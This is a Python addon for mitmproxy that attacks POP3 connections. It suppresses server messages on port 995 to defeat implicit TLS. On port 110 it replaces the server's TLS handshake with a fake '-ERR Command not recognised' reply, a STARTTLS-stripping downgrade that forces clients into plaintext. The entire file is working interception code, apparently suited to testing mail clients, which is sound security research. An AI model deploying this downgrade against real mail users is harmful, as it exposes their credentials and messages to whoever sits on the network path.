from mitmproxy import ctx
from mitmproxy import tcp, http, tls
import mitmproxy
from collections import defaultdict
from mitmproxy import command, flow
from typing import Sequence
import base64
import re

class pop3_TCP:
    def __init__(self) -> None:
        self.view = ctx.master.addons.get("view")
    
    def tcp_message(self, flow:tcp.TCPFlow):
        msg = flow.messages[-1] # latest message
        host_name = flow.server_conn.peername # ip, port
        
        if not msg.from_client:
            server_msg = bytearray(msg.content)
            if flow.server_conn.peername[1] == 995: # force client not to use implicit TLS
                server_msg = b''
                msg.content = server_msg

            if b'OK Begin TLS negotiation' in server_msg:
                ctx.log.warn('client sends starttls')
            if msg.content[0] == 0x16 and msg.content[5] == 0x02 and flow.server_conn.peername[1] == 110:
                ctx.log.warn('reject the STARTTLS after clienthello')
                # server_msg = b''
                server_msg[0:] = b'-ERR Command not recognised\r\n'
                msg.content = server_msg
                ctx.log.info(msg.content)
            
addons = [pop3_TCP()]